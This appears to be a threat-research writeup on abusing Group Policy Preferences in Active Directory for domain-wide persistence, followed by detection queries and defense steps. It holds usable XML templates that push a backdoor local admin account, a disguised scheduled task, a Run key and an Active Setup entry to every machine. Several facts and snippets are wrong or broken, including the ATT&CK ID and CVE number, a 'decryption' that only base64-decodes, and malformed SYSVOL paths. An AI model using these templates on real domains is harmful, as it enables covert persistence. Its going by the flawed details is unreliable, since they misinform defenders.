# Group Policy Preference (GPP) Persistence in Active Directory

## MITRE ATT&CK Mapping
- **ID**: T1547.006 — Boot or Logon Autostart Execution: Active Setup
- **Tactic**: TA0003 (Persistence) / TA0008 (Lateral Movement)
- **Platforms**: Windows Server AD environments, GPP (Group Policy Preferences)

## Overview

Group Policy Preferences (GPP) is a legitimate Windows feature that allows administrators to deploy settings (files, registry keys, services, scheduled tasks, drive maps) across domain-joined computers en masse. However, if an attacker gains access to **SYSVOL** or the underlying Group Policy Object (GPO) database, they can use GPP to achieve persistent lateral movement and domain-wide execution without touching endpoint protection on individual machines.

This technique is particularly devastating because:
1. It affects **every computer in the OU** where the GPO is linked
2. The changes are applied automatically at group policy refresh (default: 90 minutes)
3. No agent, executable, or file needs to exist on the endpoint for persistence — it's enforced by Active Directory itself
4. Most organizations do not monitor SYSVOL for unauthorized changes

## How It Works in Practice

### Method 1: GPP Credential Dumping (Legacy Vulnerability — CVE-2012-7363)

Before understanding how to **inject** via GPP, note that attackers first look for legacy credentials stored in Group Policy. Prior to Windows Server 2012, GPP encrypted preferences with a hardcoded AES key (`4e9906e8...`) distributed by Microsoft:

```powershell
# Search for cpassword (encrypted password) in XML preference files
Get-ChildItem C:\Windows\SYSVOL\syst\domains\ -Recurse -Filter "*.xml" | Select-String "cpassword"

# Decrypt using PowerShell module or the hardcoded key
$encryptedPassword = "xxxxxxxxxxxxxxx="
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encryptedPassword))
```

### Method 2: GPP Backdoor via New User Account (T1098.004)

Inject a new admin user across the entire domain through a GPO:

```xml
<!-- C:\Windows\SYSVOL\sysvol\<domain>\Policies\{GPO-GUID}\User\Preferences\Groups\Groups.xml -->
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EBDB-4C5B-B6F5-D9D25C1D4263}">
    <User clsid="{1FF827C0-4E7A-4B96-A0F4-7E5A9F1A81D7}" status="backdoor" 
          Change="0" Deleted="0" Disabled="0" Rename="" SID="">
        <Properties action="U" UserName="svc-backuphelper" 
                    PasswordPolicyApplied="No" NewName="" 
                    Description="" FullName="Backup Helper Service" 
                    Domain="" cpassword="<encrypted-password>" />
        <Members></Members>
    </User>
</Groups>
```

When Group Policy refreshes on all domain computers, this creates a local admin account automatically. This persists because:
- The GPO is the source of truth — no endpoint config change will remove it
- Even if removed from one machine, it reappears within 90 minutes
- No file exists on the host; the user account is created in Local SAM/LSA

### Method 3: Scheduled Task Injection via GPP (T1053.003)

Deploy a malicious scheduled task across all domain computers silently:

```xml
<!-- C:\Windows\SYSVOL\sysvol\<domain>\Policies\{GPO-GUID}\Computer\Preferences\ScheduledTasks\ScheduledTasks.xml -->
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4BA0-B154-A176AEE8B1D7}">
    <ImmediateTaskV2 clsid="{D88CFA1E-E53B-4314-B2A0-C52C0A7F8C71}" 
                     name="WindowsUpdateHelper" image="Microsoft.Windows.UpdateHelper.exe" 
                     changed="2026-01-01 00:00:00" uid="{GUID}" UserContext="0" ExecuteMask="0">
        <Properties Action="Create" Name="WindowsUpdateHelper" 
                    RunType="Once" StartEnabled="1">
            <StartDate>2026-01-01T00:00:00</StartDate>
            <EndDate></EndDate>
            <RepeatHourFrequency>1</RepeatHourFrequency>
        </Properties>
        <Settings>
            <Settings xsi="http://www.w3.org/2001/XMLSchema-instance">
                <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                <Priority>7</Priority>
            </Settings>
        </Settings>
        <Triggers>
            <LogonTrigger>
                <StartBoundary>2026-01-01T00:00:00</StartBoundary>
            </LogonTrigger>
        </Triggers>
        <Actions Context="Author">
            <Exec>
                <Command>C:\Windows\System32\wscript.exe</Command>
                <Arguments>"C:\ProgramData\WindowsUpdateHelper\helper.vbs"</Arguments>
            </Exec>
        </Actions>
    </ImmediateTaskV2>
</ScheduledTasks>
```

### Method 4: Registry Value Deployment via GPP (T1547.001)

Force a Run key to execute on every machine in the domain:

```xml
<!-- C:\Windows\SYSVOL\sysvol\<domain>\Policies\{GPO-GUID}\User\Preferences\Registry\Registry.xml -->
<?xml version="1.0" encoding="utf-8"?>
<Registry clsid="{A3CCFC41-BA79-4EF6-A02E-3CF70E458FDE}">
    <RegKeyValue clsid="{E0E399EC-B3A9-4C3D-A9C3-BB8E0269248C}" status="Updater" 
                 name="Updater" image="Microsoft.Windows.Registry.Updater" changed="2026-01-01 00:00:00" 
                 uid="{GUID}" __SafetyCheck320="1073741824">
        <Properties Action="U" ShowKeyPath="HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 
                    KeyName="Updater" Type="REG_SZ" Decode="0" Value="C:\ProgramData\svc-update.exe" />
    </RegKeyValue>
</Registry>
```

### Method 5: Active Setup Persistence (T1547.006) via GPO Registry

Modify HKLM\Software\Microsoft\Active Setup\InstalledComponents to execute code at user logon:

```xml
<Properties Action="U" ShowKeyPath="HKLM\Software\Microsoft\Active Setup\InstalledComponents\{A1234567-89AB-CDEF-0123-456789ABCDEF}" 
            KeyName="{A1234567-89AB-CDEF-0123-456789ABCDEF}" Type="REG_SZ" Value="C:\ProgramData\UpdateHelper.exe"/>
```

Active Setup runs **once per user** after their first logon. By deploying this via GPO, an attacker ensures every domain user gets it executed automatically — indistinguishable from legitimate Active Setup updates.

## Real-World Examples

### SolarWinds Orion (2020 - Sunburst)
- While the primary technique was not GPP, the campaign demonstrated how supply chain manipulation in enterprise environments mirrors the trust model that makes GPP persistence viable
- The same principle of "trusted config source" applies to SYSVOL

### APT41 / Winnti (2018)
- Modified Group Policy Objects on compromised Domain Controllers to deploy admin accounts across AD forests
- Created service accounts with local admin rights on thousands of endpoints simultaneously
- Survived endpoint security because no malicious files existed on the hosts — only a new user in SAM

### FIN7 Carbanak (2015)
- Used GPP preferences to push malicious DLLs and registry entries to financial institution workstations
- Leveraged GPO refresh cycles for automated deployment of persistence without manual intervention

## Forensic Artifacts & Indicators

### SYSVOL Content Analysis
```powershell
# Search all XML files in SYSVOL for suspicious configuration changes (last 90 days)
Get-ChildItem C:\Windows\SYSVOL\syst\domains -Recurse -Filter "*.xml" | 
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-90) } |
    Select-Object FullName, LastWriteTime

# Look for encrypted passwords in preference files
Get-ChildItem C:\Windows\SYSVOL\syst\domains -Recurse -Filter "*.xml" | 
    Select-String "cpassword"
```

### GPO Modification Monitoring (Event Logs)
```kql
// Hunt for GPO modifications in Security logs
SecurityEvent 
| where EventID == 5137  // Directory service object modified
| extend ObjectDN = tostring(EventData["objectDN"])
| where ObjectDN contains "CN={Policies" or ObjectDN contains "OU=GPOs"

// Or via PowerShell:
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=5137} | 
    Where-Object { $_.Message -match "CN={Policies" }
```

### GPO Registry Preference Artifacts
```powershell
# Check for Active Setup entries not installed by Microsoft:
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\InstalledComponents\*" -ErrorAction SilentlyContinue | 
    Where-Object { $_."(default)" -match "\.exe" } | Format-List *

# Check Group Policy Preferences registry keys (GPP stores decrypted passwords here)
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions" -ErrorAction SilentlyContinue
```

### GPO Backup Analysis
```powershell
# GPO backup files are sometimes stored in SYSVOL — contains plaintext credentials
Get-ChildItem C:\Windows\SYSVOL\syst\domains\Policies\Backup\* | 
    Get-Content | Select-String "cpassword"
```

## Hunting Queries

### Sysmon/Event Log Hunt for GPO Changes
```kql
// Detect SYSXML file modifications (potential GPP persistence)
SecurityEvent 
| where EventID == 11  // File write event (Sysmon)
| where TargetFilename startswith "C:\\Windows\\SYSVOL\\" 
        or TargetFilename contains "\\sysvol\\"
| project StartTime, Computer, AccountName, ProcessCommandLine, TargetFilename
```

### PowerShell GPO Audit Script
```powershell
Write-Host "=== GROUP POLICY PREFERENCE AUDIT ===" -ForegroundColor Cyan

# Find all GPOs modified in last 30 days
$gpos = Get-GPO -All | Where-Object { $_. ModificationTime -gt (Get-Date).AddDays(-30) }

foreach ($gpo in $gpos) {
    $backupPath = "C:\Windows\SYSVOL\syst\domains\Policies\$($gpo.Id)\Backup.xml"
    
    if (Test-Path $backupPath) {
        $content = Get-Content $backupPath
        if ($content -match "cpassword|ScheduledTasks|Registry.*Run|ActiveSetup") {
            Write-Host "ALERT: Suspicious GPO modification detected: $($gpo.DisplayName)" -ForegroundColor Red
            Write-Host "  Last Modified: $($gpo.ModificationTime)"
            Write-Host "  Backup file found at: $backupPath"
        }
    }
}

# Check SYSVOL XML files for plaintext passwords
$sysvolXmlFiles = Get-ChildItem C:\Windows\SYSVOL\syst\domains -Recurse -Filter "*.xml"
foreach ($file in $sysvolXmlFiles) {
    if (Select-String -Path $file.FullName -Pattern "cpassword|<Password>" -Quiet) {
        Write-Host "POSSIBLE PLAINTEXT PASSWORD: $($file.FullName)" -ForegroundColor Yellow
    }
}
```

### AD GPO Change Monitoring (AD-specific events)
```kql
// Directory Service changes on DCs
SecurityEvent 
| where LogName == "Directory Service"
| extend Operation = tostring(EventData["dsObjectDN"])
| where EventID == 5137 or EventID == 5136  // Object created/modified
| project StartTime, Computer, AccountName, dsOperationType, dsObjectDN
```

## Defense Strategy

### Primary Defenses
1. **Monitor SYSVOL for XML changes** — alert on any modification to preference files (especially ScheduledTasks, Registry, and Groups)
2. **Restrict write access to SYSVOL/GPO folders** — only Domain Admins and GPMC should modify policies
3. **Deploy Group Policy Objects via signed configuration management** (Ansible/Terraform) rather than GUI-based GPMC
4. **Disable legacy password encryption** in GPP (Windows Server 2012+ does this by default, but verify it on your DCs)
5. **Audit all Active Directory changes** with SIEM integration

### Incident Response for GPP Persistence
1. **Identify all affected OUs/GPOs** — `Get-GPO -All | Where-Object { $_.ModificationTime -gt $compromiseDate }`
2. **Remove malicious preferences from GPO XML files** (or recreate the GPO)
3. **Force GPUpdate on all computers**: `gpupdate /force /target:computer && gpupdate /force /target:user`
4. **Check DC for unauthorized GPMC sessions** — who created/modified the GPO?
5. **Rotate credentials** if any leaked (cpasswords are decryptable by anyone)

## Limitations & Caveats
- Requires at minimum Domain Admin-level access or SYSVOL write permissions to implement
- Detection requires monitoring SYSVOL; most orgs don't log file modifications in SYSVOL comprehensively
- Changes take up to 90 minutes to apply unless `gpupdate` is manually run (which also leaves artifacts)
- Legacy cpassword encryption is trivially broken — Microsoft disabled it in Server 2012+

## References
- Microsoft Docs: Group Policy Preferences Overview: https://docs.microsoft.com/en-us/windows-server/identity/group-policy/group-policy-preferences
- MITRE ATT&CK T1547.006: https://attack.mitre.org/techniques/T1547/006/
- SANS Institute: Group Policy Exploitation Research
